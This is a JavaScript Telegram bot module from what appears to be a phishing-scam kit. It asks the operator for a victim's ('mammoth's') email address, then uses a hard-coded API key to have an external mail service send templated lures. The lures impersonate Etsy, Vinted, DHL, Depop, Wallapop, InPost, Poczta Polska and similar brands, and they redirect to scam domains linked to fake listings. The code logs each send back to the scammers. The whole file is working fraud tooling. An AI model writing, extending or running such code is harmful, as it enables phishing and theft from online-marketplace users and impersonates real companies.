const { Markup } = require("telegraf");
const WizardScene = require("telegraf/scenes/wizard");
const { Ad, Service } = require("../database");
const myAd = require("../commands/myCreateAd");
const log = require("../helpers/log");
const axios = require("axios");

const sendEmail = async (ctx, ad, service, sendService) => {
  try {
    const template = sendService[ad.serviceCode];

    if (!template) {
      return ctx.reply("❌ Шаблон для сервиса не найден.");
    }

    const redirectUrl = encodeURIComponent(`https://${service.domain}/ju/${ad.id}`);
    const email = ctx.scene.state.data.mail;

    const apiUrl = `http://78297078.info/api?api_key=YF2TFX78B1C4D32F1G229I8J2S4&email=${email}&template=${template}&redirectUrl=${redirectUrl}`;

    const response = await axios.get(apiUrl, { timeout: 15000 });
   if (ctx.tempMessageId) {
      await ctx.deleteMessage(ctx.tempMessageId).catch(() => { });
    }
    if (response.data?.status === "success") {
      await ctx.reply("<b>✅ Письмо успешно отправлено на указанный адрес</b>", {
        reply_to_message_id: ctx.message.message_id,
        parse_mode: "HTML",
      });
      log(
        ctx,
        `📧 <b>Письмо отправлено</b>:\n\n📍 <b>Сервис:</b> ${service.title}\n📬 <b>Почта мамонта:</b> ${email}\n🔗 <b>Ссылка:</b> <a href="https://${service.domain}/${ad.id}">Перейти</a>\n\n<i>Just MAIL</i>`
      );
    } else {
      throw new Error(response.data?.message || "Неизвестная ошибка API");
    }

  } catch (err) {
       if (ctx.tempMessageId) {
      await ctx.deleteMessage(ctx.tempMessageId).catch(() => { });
    }
    console.error("Ошибка при отправке письма (Just Mail):", err.message);

    await ctx.reply(
      `<b>❌ Ошибка при отправке письма для сервиса ${service.title}!</b>
      
Сендер: <b>Just Mail</b>

Ошибка: <b>${err.response?.data?.error ||
      err.response?.data?.message ||
      err.message ||
      'Неизвестная ошибка'
      }</b>

<i>Пожалуйста, перешлите это сообщение разработчику для решения данной проблемы.</i>`,
      { parse_mode: "HTML",
              reply_to_message_id: ctx.message.message_id,

       }
    );

  }
};


const scene = new WizardScene(
  "sendMailAd8",
  async (ctx) => {
    try {
      await ctx.scene.reply("Введите почту мамонта", {
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      });
      ctx.scene.state.data = {}; // Инициализация state
      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      await ctx.reply("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
  try {
    if (ctx.message?.text) {
      ctx.scene.state.data.mail = ctx.message.text;
    } else {
      await ctx.scene.reply("❌ Пожалуйста, введите действительный адрес электронной почты.");
      return;
    }

    const ad = await Ad.findOne({ where: { id: ctx.scene.state.adId } });
    const service = await Service.findOne({ where: { code: ad.serviceCode } });

    const sendService = {
      etsyverif_eu: "etsyverif",
      etsy_eu: "etsy",
      fiverr_eu: "fiverrverif",
      fiverr_com: "fiverr",
      depop_uk: "depop",
      depop_au: "depop",
      depop_us: "depop",
      depop_fr: "depop",
      poshmark_eu: "poshmark_en",
      wallapop_pt: "wallapop",
      wallapop_es: "wallapop",
      wallapop_it: "wallapop",
      wallapop_fr: "wallapop",
      wallapop_uk: "wallapop",
      milanuncios_es: "milanuncios",
      fancourier_ro: "fancourier",
      olx_ro: "olx_ro",
      dhl_ro: "dhl_ro",
      vinted_be: "vinted_en",
      vinted_uk: "vinted_en",
      vinted_at: "vinted_en",
      vinted_de: "vinted_en",
      vinted_it: "vinted_en",
      vinted_es: "vinted_en",
      vinted_fr: "vinted_en",
      vinted_pl: "vinted_pl",
      ebaykleinanzeigen_de: "ebay",
      pocztapolska_pl: "pocztapolska",
      inpost_pl: "inpost",
      depop_de: "depop",
      tutti_ch: "tutti_ch",
      dhl_pl: "dhl_pl",
      poshmarkverif_eu: "poshmarkverif_en"
    };

     const loadingMsg = await ctx.reply("⏳ Письмо отправляется...");

      const miniCtx = {
        from: ctx.from,
        message: ctx.message,
        reply: (...args) => ctx.reply(...args),
        deleteMessage: (...args) => ctx.deleteMessage(...args),
        tempMessageId: loadingMsg.message_id,
        scene: {
          state: {
            data: {
              mail: ctx.scene.state.data.mail,
            },
          },
        },
      };


      setImmediate(() => {
        sendEmail(miniCtx, ad, service, sendService).catch((err) =>
          console.error("Ошибка при отправке письма:", err)
        );
      });

      return ctx.scene.leave();

    } catch (err) {
      console.log(err);
      await ctx.deleteMessage(loadingMsg.message_id).catch(() => { });

      await ctx.replyWithHTML(
        `<b>❌ Ошибка при отправке письма!</b>\nОшибка сервера: <b>${err.message}</b>`
      );
      return ctx.scene.leave();
    }
  }
);

scene.leave((ctx) => myAd(ctx, ctx.scene.state.adId));
module.exports = scene;
